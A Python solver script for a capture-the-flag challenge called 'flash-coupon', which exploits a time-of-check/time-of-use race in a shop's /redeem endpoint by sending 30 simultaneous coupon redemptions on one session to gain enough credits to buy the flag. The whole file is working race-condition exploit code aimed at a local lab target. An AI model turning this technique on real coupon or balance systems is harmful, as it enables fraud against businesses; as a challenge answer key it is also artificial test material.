#!/usr/bin/env python3
"""Automated solver for challenge 5 - flash-coupon.

The bug is a TOCTOU race in POST /redeem: the "has this shopper used FLASH50?"
check and the balance update are separate, with a 50 ms delay between them.

This solver:
  1. Creates a fresh shopper account (GET / sets the signed session cookie).
  2. Fires 30 POST /redeem requests at the same instant through a
     threading.Barrier, reusing that one shopper session.
  3. Reads the resulting balance. Four or more successful redemptions give at
     least 10 + 4*50 = 210 credits.
  4. If the race gave at least 200 credits, POSTs /buy with item=flag and
     prints the flag.
  5. Otherwise retries with a brand-new shopper account.

Progress is written to stderr; stdout contains only the flag.
"""

import re
import sys
import threading

import requests

FLAG_RE = re.compile(r"ingehack\{[^}]+\}")
BALANCE_RE = re.compile(r'<strong id="balance">(\d+)</strong>')

ATTEMPTS = 5
REDEEM_REQUESTS = 30
FLAG_PACK_PRICE = 200


def log(message):
    print("[*] " + message, file=sys.stderr)


def fail(message):
    print("[-] " + message, file=sys.stderr)
    sys.exit(1)


def parse_balance(html, where):
    match = BALANCE_RE.search(html)
    if not match:
        fail("could not read the balance from " + where)
    return int(match.group(1))


def race_redemptions(base, cookie_dict):
    """Send REDEEM_REQUESTS /redeem requests as simultaneously as possible."""
    barrier = threading.Barrier(REDEEM_REQUESTS, timeout=15)
    statuses = [0] * REDEEM_REQUESTS
    errors = []
    errors_lock = threading.Lock()

    def worker(index):
        try:
            # Every worker waits here until all 30 are ready, then they all
            # leave the barrier within a few microseconds of each other.
            barrier.wait()
        except threading.BrokenBarrierError:
            with errors_lock:
                errors.append("barrier did not release")
            return

        try:
            response = requests.post(
                base + "/redeem",
                data={"code": "FLASH50"},
                cookies=cookie_dict,
                timeout=20,
            )
            statuses[index] = response.status_code
        except requests.RequestException as exc:
            with errors_lock:
                errors.append(str(exc))

    threads = [
        threading.Thread(target=worker, args=(index,))
        for index in range(REDEEM_REQUESTS)
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=30)

    stuck = sum(1 for thread in threads if thread.is_alive())
    return statuses, errors, stuck


def solve(base):
    for attempt in range(1, ATTEMPTS + 1):
        log("attempt %d: creating a fresh shopper" % attempt)
        session = requests.Session()

        page = session.get(base + "/", timeout=15)
        page.raise_for_status()
        if FLAG_RE.search(page.text):
            fail("the flag is visible before buying the Flag Pack")

        balance = parse_balance(page.text, "GET /")
        log("starting balance: %d credits" % balance)

        # Snapshot the signed session cookie. Each burst request sends the same
        # cookie through its own short-lived connection, so the shopper session
        # is shared but requests.Session is not used from several threads.
        cookie_dict = requests.utils.dict_from_cookiejar(session.cookies)

        log("sending %d parallel /redeem requests" % REDEEM_REQUESTS)
        statuses, errors, stuck = race_redemptions(base, cookie_dict)
        ok = sum(1 for status in statuses if status == 200)
        log(
            "race finished: %d HTTP 200 responses, %d errors, %d stuck threads"
            % (ok, len(errors), stuck)
        )
        if errors:
            log("first transport error: " + errors[0])

        page = session.get(base + "/", timeout=15)
        page.raise_for_status()
        if FLAG_RE.search(page.text):
            fail("the flag is visible before buying the Flag Pack")

        balance = parse_balance(page.text, "GET / after the race")
        log("balance after the race: %d credits" % balance)

        if balance < FLAG_PACK_PRICE:
            log(
                "not enough credits for the %d-credit Flag Pack; "
                "retrying with a new shopper" % FLAG_PACK_PRICE
            )
            continue

        log("buying the Flag Pack")
        purchase = session.post(
            base + "/buy",
            data={"item": "flag"},
            timeout=15,
        )
        purchase.raise_for_status()

        match = FLAG_RE.search(purchase.text)
        if not match:
            log("purchase succeeded but no flag was in the response; retrying")
            continue

        return match.group(0)

    fail("the race did not yield enough credits after %d attempts" % ATTEMPTS)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8005"
    flag = solve(base)
    print(flag)


if __name__ == "__main__":
    main()
